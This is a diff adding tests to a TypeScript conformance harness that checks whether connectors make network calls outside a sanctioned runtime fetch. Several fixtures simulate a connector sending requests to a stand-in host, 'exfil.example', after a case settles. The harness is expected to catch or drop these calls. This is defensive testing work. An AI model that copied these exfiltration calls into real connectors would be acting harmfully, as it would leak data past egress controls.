@@ -14,6 +14,7 @@ import {
   type ConnectorConformanceOptions,
   type ConnectorConformanceReport,
   type ConnectorConformanceRuntime,
+  type ConnectorInvocationOptions,
   type ConnectorPolicies,
   createConnector,
   type EgressResponse,
@@ -86,6 +87,17 @@ const escaping = () =>
 
 function quietFactory(execute: Execute = async () => ({})) {
   return factory(execute, noEgress);
+}
+
+function unreadablePrototype(): object {
+  return new Proxy(
+    { marker: 'unreadable-prototype' },
+    {
+      getPrototypeOf(): never {
+        throw new Error('prototype unreadable');
+      },
+    },
+  );
 }
 
 function entryOptions(target: object): ConnectorConformanceOptions {
@@ -809,6 +821,233 @@ describe('connector egress conformance', () => {
       );
     }
     expect(getter).toHaveBeenCalledTimes(1);
+  });
+
+  it('reports CASE_INVOCATION_FAILED when execute throws undefined', async () => {
+    const report = await rejected(
+      assertConnectorConformance(
+        quietFactory(async () => {
+          throw undefined;
+        }),
+        { manifest: noEgress, cases: [quietCase] },
+      ),
+    );
+    expect(report.conformant).toBe(false);
+    expect(report.findings).toEqual([
+      {
+        code: 'CASE_INVOCATION_FAILED',
+        case: 'quiet',
+        reason: 'case invocation failed with undefined',
+      },
+    ]);
+  });
+
+  it('reports CASE_INVOCATION_FAILED when an invocation option getter throws an unreadable value', async () => {
+    // #given
+    const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
+    const hostile = unreadablePrototype();
+    const execute = vi.fn(async () => ({}));
+    const invocation: ConnectorInvocationOptions = {
+      get toolCallId(): string {
+        throw hostile;
+      },
+    };
+    // #when
+    const report = await rejected(
+      assertConnectorConformance(quietFactory(execute), {
+        manifest: noEgress,
+        cases: [{ ...quietCase, invocation }],
+      }),
+    );
+    // #then
+    expect(report.conformant).toBe(false);
+    expect(report.findings).toEqual([
+      {
+        code: 'CASE_INVOCATION_FAILED',
+        case: 'quiet',
+        reason: 'case invocation failed with unknown',
+      },
+      expect.objectContaining({
+        code: 'POLICIES_NOT_WIRED',
+        case: 'quiet',
+        member: 'audit',
+      }),
+    ]);
+    expect(execute).not.toHaveBeenCalled();
+    expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
+  });
+
+  it('reports CASE_INVOCATION_FAILED when execute throws a value whose prototype cannot be read', async () => {
+    // #given
+    const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
+    const hostile = unreadablePrototype();
+    // #when
+    const report = await rejected(
+      assertConnectorConformance(
+        quietFactory(async () => {
+          throw hostile;
+        }),
+        { manifest: noEgress, cases: [quietCase] },
+      ),
+    );
+    // #then
+    expect(report.conformant).toBe(false);
+    expect(report.findings).toEqual([
+      {
+        code: 'CASE_INVOCATION_FAILED',
+        case: 'quiet',
+        reason: 'case invocation failed with unknown',
+      },
+    ]);
+    expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
+  });
+
+  it('reports CASE_INVOCATION_FAILED when execute settles with a thenable whose then getter throws', async () => {
+    // #given
+    const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
+    const hostile = unreadablePrototype();
+    const thenable = {
+      // biome-ignore lint/suspicious/noThenProperty: the fixture is a thenable on purpose — the harness must survive the throw that promise adoption raises when it reads `then`.
+      get then(): never {
+        throw hostile;
+      },
+    };
+    // #when
+    const report = await rejected(
+      assertConnectorConformance(
+        quietFactory(async () => thenable),
+        { manifest: noEgress, cases: [quietCase] },
+      ),
+    );
+    // #then
+    expect(report.conformant).toBe(false);
+    expect(report.findings).toEqual([
+      {
+        code: 'CASE_INVOCATION_FAILED',
+        case: 'quiet',
+        reason: 'case invocation failed with unknown',
+      },
+    ]);
+    expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
+  });
+
+  it('records an escape observed after its case settled as a run-level finding', async () => {
+    // #given
+    const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
+    let release!: () => void;
+    const gate = new Promise<void>((resolve) => {
+      release = resolve;
+    });
+    let late: Promise<void> | undefined;
+    let lateRefusal: unknown;
+    const subject: ConnectorConformanceFactory<unknown, unknown> = (
+      runtime,
+    ) => {
+      const base = runtime.policies.fetch as unknown as (
+        url: string,
+      ) => Promise<unknown>;
+      return quietFactory(async (input) => {
+        if ((input as { phase?: string }).phase === 'capture') {
+          late = (async () => {
+            await gate;
+            try {
+              await base('https://exfil.example/late');
+            } catch (error) {
+              lateRefusal = error;
+            }
+          })();
+          return {};
+        }
+        release();
+        await new Promise<void>((resolve) => {
+          setTimeout(resolve, 0);
+        });
+        return {};
+      })(runtime);
+    };
+    // #when
+    const report = await rejected(
+      assertConnectorConformance(subject, {
+        manifest: noEgress,
+        cases: [
+          {
+            name: 'capture',
+            input: { phase: 'capture' },
+            expect: { outcome: 'no-network' },
+          },
+          {
+            name: 'settle',
+            input: { phase: 'settle' },
+            expect: { outcome: 'no-network' },
+          },
+        ],
+      }),
+    );
+    await late;
+    // #then
+    expect(report.conformant).toBe(false);
+    expect(report.findings).toEqual([
+      {
+        code: 'NETWORK_IO_OUTSIDE_RUNTIME_FETCH',
+        reason:
+          "connector reached policies.fetch outside runtime.fetch (host: exfil.example); observed after case 'capture' settled",
+      },
+    ]);
+    expect(report.findings[0]).not.toHaveProperty('case');
+    expect(report.cases[0]?.escapes).toEqual([]);
+    expect(report.cases[0]?.findings).toEqual([]);
+    expect(report.cases[1]?.findings).toEqual([]);
+    expect(lateRefusal).toBeInstanceOf(Error);
+    expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
+  });
+
+  it('drops a probe escape observed after early refusal', async () => {
+    let base!: (url: string) => Promise<unknown>;
+    const report = await rejected(
+      assertConnectorConformance(
+        (runtime) => {
+          base = runtime.policies.fetch as (url: string) => Promise<unknown>;
+          throw new Error('probe factory failed');
+        },
+        { manifest: noEgress, cases: [quietCase] },
+      ),
+    );
+    const findingsBefore = structuredClone(report.findings);
+    const lengthBefore = report.findings.length;
+    expect(() => base('https://exfil.example/after')).toThrow(
+      'connector called the supplied base transport directly',
+    );
+    expect(report.findings).toHaveLength(lengthBefore);
+    expect(report.findings).toEqual(findingsBefore);
+  });
+
+  it('drops an escape observed after the report is built', async () => {
+    // #given
+    const saved = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
+    let base!: (url: string) => Promise<unknown>;
+    const subject: ConnectorConformanceFactory<unknown, unknown> = (
+      runtime,
+    ) => {
+      base = runtime.policies.fetch as unknown as (
+        url: string,
+      ) => Promise<unknown>;
+      return quietFactory()(runtime);
+    };
+    const report = await assertConnectorConformance(subject, {
+      manifest: noEgress,
+      cases: [quietCase],
+    });
+    const findingsBefore = report.findings.length;
+    const casesBefore = structuredClone(report.cases);
+    // #when
+    expect(() => base('https://exfil.example/after')).toThrow(
+      'connector called the supplied base transport directly',
+    );
+    // #then
+    expect(report.conformant).toBe(true);
+    expect(report.findings).toHaveLength(findingsBefore);
+    expect(report.cases).toEqual(casesBefore);
+    expect(Object.getOwnPropertyDescriptor(globalThis, 'fetch')).toEqual(saved);
   });
 
   it('records NETWORK_IO_OUTSIDE_RUNTIME_FETCH without CASE_INVOCATION_FAILED for an uncaught global fetch refusal', async () => {
@@ -1586,6 +1825,48 @@ describe('connector egress conformance', () => {
     expect(report.cases[0]?.proved).toBe('guarded-request');
     expect(report.cases[0]?.findings).toEqual([]);
     expect(report.cases[0]?.decisionCodes).toContain(undefined);
+  });
+
+  it('preserves the audit witness when the connector mutates the returned event', async () => {
+    const reports: ConnectorConformanceReport[] = [];
+    for (const mutate of [false, true]) {
+      reports.push(
+        await assertConnectorConformance(
+          (runtime) =>
+            quietFactory(async () => {
+              const event = runtime.policies.audit.record({
+                actor: null,
+                action: 'tool.call',
+                resource: 'vendor.read',
+                decision: 'denied',
+                decisionCode: 'EVALUATOR_DENIED',
+                policyKind: 'evaluator',
+                reason: 'policy denied',
+              });
+              if (mutate) {
+                Object.defineProperty(event, 'decisionCode', {
+                  get() {
+                    throw new Error('decisionCode unreadable');
+                  },
+                });
+              }
+              return {};
+            })(runtime),
+          {
+            manifest: noEgress,
+            cases: [
+              {
+                ...quietCase,
+                expect: { outcome: 'policy-denied', code: 'EVALUATOR_DENIED' },
+              },
+            ],
+          },
+        ),
+      );
+    }
+    expect(reports[0]?.conformant).toBe(true);
+    expect(reports[0]?.cases[0]?.proved).toBe('policy-denied');
+    expect(reports[1]).toEqual(reports[0]);
   });
 
   it("records at least one audit event for every expectation outcome that reaches the connector's gate boundary", async () => {
